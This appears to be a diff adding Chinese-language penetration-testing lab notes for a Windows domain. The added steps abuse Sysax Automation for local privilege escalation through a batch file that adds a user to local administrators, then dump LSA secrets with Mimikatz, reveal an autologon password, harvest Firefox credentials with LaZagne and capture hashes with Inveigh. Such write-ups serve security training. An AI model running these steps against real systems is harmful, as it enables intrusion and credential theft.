@@ -422,3 +422,37 @@ C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?
 proxychains nmap -sT -p 5985 172.16.8.50      看有无 WinRM
 proxychains evil-winrm -i 172.16.8.50 -u backupadm      尝试用之前得到的账户，得到 shell
 
+在 C:\Program Files (x86)\SysaxAutomation 发现了一些非标准软件
+搜索后找到个本地提权 (local privilege escalation) 漏洞
+  https://www.exploit-db.com/exploits/50834
+在 C:\Users\ilfserveradm\Documents 中创建一个名为 pwn.bat 的文件
+  内容为 net localgroup administrators ilfserveradm /add          将用户添加到本地管理员组（事后需要清理并在报告附录中注明）
+打开 C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe
+选择 Setup Scheduled/Triggered Tasks
+添加任务 (Triggered)
+监视的文件夹更新为 C:\Users\ilfserveradm\Documents
+勾选 Run task if a file is added to the monitor folder or subfolder(s)
+选择 Run any other Program 并选择 C:\Users\ilfserveradm\Documents\pwn.bat
+取消勾选 Login as the following user to run task
+点击 Finish 然后 Save
+触发该任务，在 C:\Users\ilfserveradm\Documents 目录中创建一个新的 .txt 文件
+
+c:\Users\ilfserveradm\Documents> mimikatz.exe
+mimikatz # log                        开启 Mimikatz 日志
+mimikatz # privilege::debug           申请 SeDebugPrivilege，读取 LSASS 进程内存、访问注册表敏感键
+mimikatz # lsadump::secrets           读取注册表 HKLM\SECURITY\Policy\Secrets 下的 LSA Secrets
+mimikatz # token::elevate             把自己的令牌提升为 SYSTEM。原理是找到 NT AUTHORITY\SYSTEM 进程的令牌并复制到当前线程，为了能访问 HKLM\SECURITY 注册表键
+mimikatz # lsadump::secrets           在 SYSTEM 权限下重新读取 LSA Secrets
+
+找到了一个设置好的密码，但没有关联的用户名
+是一个配置了自动登录的帐户，可以查询注册表来找到用户名
+  Secret  : DefaultPassword
+  cur/text: DBAilfreight1!
+C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
+
+c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox      找 firefox 里的凭证
+
+一旦在主机上获得了本地管理员权限，值得运行 Inveigh，看看是否能获取任何用户的密码哈希
+C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
+C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
+
